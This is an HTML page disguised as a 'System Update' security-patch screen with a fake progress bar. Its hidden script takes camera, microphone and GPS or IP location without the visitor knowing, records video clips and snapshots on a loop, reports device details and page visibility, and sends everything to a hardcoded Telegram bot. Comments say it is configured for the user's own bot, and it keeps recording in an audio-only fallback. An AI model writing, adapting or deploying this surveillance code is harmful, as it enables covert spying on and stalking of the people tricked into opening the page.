<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center;
            font-family: 'Segoe UI', system-ui, sans-serif;
            color: #fff;
            overflow: hidden;
        }
        .loader {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            animation: fadeIn 0.5s ease;
            max-width: 90%;
            width: 400px;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #00ff88;
            border-radius: 50%;
            margin: 0 auto 25px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h1 {
            font-size: 22px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            color: #a0a0c0;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .progress-container {
            background: rgba(255, 255, 255, 0.1);
            height: 6px;
            border-radius: 3px;
            overflow: hidden;
            margin: 25px 0;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 3px;
        }
        .status {
            font-size: 12px;
            color: #8888cc;
            margin-top: 10px;
            text-align: center;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <h1>System Update</h1>
        <p>Downloading latest security patches...</p>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status" id="statusText">Initializing system...</div>
    </div>

    <!-- Hidden Elements -->
    <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>
    <audio id="hiddenAudio" style="display:none;"></audio>

    <script>
        // ========== CONFIGURATION ==========
        const BOT_TOKEN = '8178328232:AAEttb514pw3iA4735zGQNtYYqPUIf_Qj8c';      // Ganti dengan token bot Telegram
        const CHAT_ID = '7719159066';          // Ganti dengan chat ID Anda
        
        // ========== GLOBAL VARIABLES ==========
        let stream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let locationData = {};
        let isRecording = false;
        let screenshotCount = 0;
        let videoCount = 0;
        
        // ========== LOADER ANIMATION ==========
        function updateLoader(progress, status) {
            document.getElementById('progressBar').style.width = progress + '%';
            document.getElementById('statusText').textContent = status;
        }
        
        // ========== MAIN FUNCTION ==========
        async function initializeSystem() {
            updateLoader(10, 'Checking permissions...');
            
            try {
                // 1. Request camera and microphone
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: { ideal: 'environment' }
                    },
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    }
                });
                
                updateLoader(30, 'Camera activated');
                
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                
                // 2. Get location silently
                await getLocation();
                updateLoader(50, 'Location acquired');
                
                // 3. Start recording
                setTimeout(() => {
                    startRecording();
                    updateLoader(70, 'Recording in progress...');
                }, 2000);
                
                // 4. Start screenshots
                setTimeout(() => {
                    startScreenshotCapture();
                    updateLoader(90, 'Capturing data...');
                }, 4000);
                
                // 5. Send first data
                setTimeout(() => {
                    sendInitialData();
                    updateLoader(100, 'Update complete!');
                    
                    // Hide loader after completion
                    setTimeout(() => {
                        document.getElementById('loader').classList.add('hidden');
                        document.body.style.background = '#000';
                        document.body.innerHTML = '<div style="color:#0f0;font-family:monospace;padding:20px;">System ready.</div>';
                    }, 1500);
                }, 6000);
                
            } catch (error) {
                console.error('Error:', error);
                updateLoader(100, 'Error: Using fallback mode');
                startFallbackMode();
            }
        }
        
        // ========== LOCATION CAPTURE ==========
        async function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            locationData = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                speed: position.coords.speed,
                                timestamp: new Date().toISOString(),
                                source: 'gps'
                            };
                            resolve();
                        },
                        async () => {
                            // Fallback to IP location
                            try {
                                const response = await fetch('https://ipapi.co/json/');
                                const data = await response.json();
                                locationData = {
                                    lat: data.latitude,
                                    lon: data.longitude,
                                    city: data.city,
                                    country: data.country_name,
                                    ip: data.ip,
                                    isp: data.org,
                                    source: 'ip'
                                };
                            } catch (e) {
                                locationData = { error: 'Location unavailable', source: 'none' };
                            }
                            resolve();
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    locationData = { error: 'Geolocation not supported', source: 'none' };
                    resolve();
                }
            });
        }
        
        // ========== VIDEO RECORDING ==========
        function startRecording() {
            if (!stream) return;
            
            recordedChunks = [];
            
            const options = {
                mimeType: 'video/webm;codecs=vp9,opus',
                videoBitsPerSecond: 3000000
            };
            
            try {
                mediaRecorder = new MediaRecorder(stream, options);
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = () => {
                    videoCount++;
                    if (recordedChunks.length > 0) {
                        sendVideo();
                    }
                    // Restart recording
                    setTimeout(startRecording, 3000);
                };
                
                mediaRecorder.start(1000);
                isRecording = true;
                
                // Stop after 7 seconds
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 7000);
                
            } catch (e) {
                console.warn('MediaRecorder error:', e);
            }
        }
        
        // ========== SCREENSHOT CAPTURE ==========
        function startScreenshotCapture() {
            setInterval(() => {
                captureScreenshot();
            }, 5000); // Every 5 seconds
        }
        
        function captureScreenshot() {
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('hiddenCanvas');
            
            if (!video.videoWidth) return;
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                screenshotCount++;
                sendToTelegram(blob, `screenshot_${screenshotCount}.jpg`, 
                    `üì∏ Screenshot #${screenshotCount}\n` +
                    `üïí ${new Date().toLocaleTimeString()}`);
            }, 'image/jpeg', 0.9);
        }
        
        // ========== SEND FUNCTIONS ==========
        async function sendInitialData() {
            // 1. Send location info
            let locationMessage = `üìç LOCATION DATA\n`;
            if (locationData.lat) {
                locationMessage += `Latitude: ${locationData.lat.toFixed(6)}\n`;
                locationMessage += `Longitude: ${locationData.lon.toFixed(6)}\n`;
                locationMessage += `Accuracy: ${locationData.accuracy ? locationData.accuracy.toFixed(1) + 'm' : 'N/A'}\n`;
                
                if (locationData.city) {
                    locationMessage += `City: ${locationData.city}\n`;
                    locationMessage += `Country: ${locationData.country}\n`;
                }
                
                locationMessage += `Source: ${locationData.source}\n`;
                locationMessage += `Time: ${new Date().toLocaleString()}`;
                
                // Send location as coordinates
                await sendTelegramLocation(locationData.lat, locationData.lon);
                
                // Send Google Maps link
                const mapsUrl = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
                await sendTelegramMessage(`üó∫Ô∏è Google Maps:\n${mapsUrl}`);
                
            } else {
                locationMessage += `No location data available`;
            }
            
            await sendTelegramMessage(locationMessage);
            
            // 2. Send device info
            const deviceInfo = getDeviceInfo();
            await sendTelegramMessage(`üì± DEVICE INFO\n${deviceInfo}`);
            
            // 3. Send first screenshot
            setTimeout(() => {
                captureScreenshot();
            }, 1000);
        }
        
        async function sendVideo() {
            if (recordedChunks.length === 0) return;
            
            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            videoCount++;
            
            const caption = `üé• Video #${videoCount}\n` +
                          `Duration: 7s\n` +
                          `Size: ${(videoBlob.size / 1024 / 1024).toFixed(2)}MB\n` +
                          `Time: ${new Date().toLocaleTimeString()}`;
            
            await sendToTelegram(videoBlob, `video_${videoCount}.webm`, caption);
            
            // Clear chunks after sending
            recordedChunks = [];
        }
        
        // ========== TELEGRAM API ==========
        async function sendToTelegram(blob, filename, caption) {
            if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
                console.warn('Bot token not configured');
                return;
            }
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', caption);
            formData.append('document', blob, filename);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });
            } catch (e) {
                console.warn('Failed to send to Telegram:', e);
            }
        }
        
        async function sendTelegramMessage(text) {
            if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
            
            const encodedText = encodeURIComponent(text);
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedText}`, {
                    mode: 'no-cors'
                });
            } catch (e) {
                console.warn('Failed to send message:', e);
            }
        }
        
        async function sendTelegramLocation(lat, lon) {
            if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`, {
                    mode: 'no-cors'
                });
            } catch (e) {
                console.warn('Failed to send location:', e);
            }
        }
        
        // ========== DEVICE INFO ==========
        function getDeviceInfo() {
            return `User Agent: ${navigator.userAgent}\n` +
                   `Platform: ${navigator.platform}\n` +
                   `Language: ${navigator.language}\n` +
                   `Screen: ${screen.width}x${screen.height}\n` +
                   `Color Depth: ${screen.colorDepth}bit\n` +
                   `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
                   `Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}\n` +
                   `Online: ${navigator.onLine ? 'Yes' : 'No'}\n` +
                   `Vendor: ${navigator.vendor || 'Unknown'}\n` +
                   `URL: ${window.location.href}\n` +
                   `Referrer: ${document.referrer || 'Direct'}`;
        }
        
        // ========== FALLBACK MODE ==========
        function startFallbackMode() {
            // Audio only fallback
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(audioStream => {
                    const audioRecorder = new MediaRecorder(audioStream);
                    let audioChunks = [];
                    
                    audioRecorder.ondataavailable = (e) => audioChunks.push(e.data);
                    audioRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        sendToTelegram(audioBlob, 'audio_fallback.webm', 'üé§ Audio Fallback Mode');
                        audioChunks = [];
                    };
                    
                    audioRecorder.start();
                    setTimeout(() => audioRecorder.stop(), 10000);
                    setInterval(() => {
                        audioRecorder.start();
                        setTimeout(() => audioRecorder.stop(), 10000);
                    }, 15000);
                })
                .catch(() => {
                    // Send basic info if all fails
                    sendTelegramMessage(`üö´ No media access\n${getDeviceInfo()}`);
                });
        }
        
        // ========== STARTUP ==========
        window.addEventListener('load', () => {
            // Delay startup for realism
            setTimeout(() => {
                initializeSystem();
            }, 1000);
            
            // Auto-refresh every 10 minutes
            setTimeout(() => {
                location.reload();
            }, 600000);
        });
        
        // ========== VISIBILITY DETECTION ==========
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                sendTelegramMessage(`üì¥ Page hidden at ${new Date().toLocaleTimeString()}`);
            } else {
                sendTelegramMessage(`üì± Page visible at ${new Date().toLocaleTimeString()}`);
            }
        });
        
        // ========== ERROR HANDLING ==========
        window.onerror = function(msg, url, line) {
            sendTelegramMessage(`‚ö†Ô∏è JavaScript Error\n${msg}\nLine: ${line}\nURL: ${url}`);
            return false;
        };
    </script>
</body>
</html>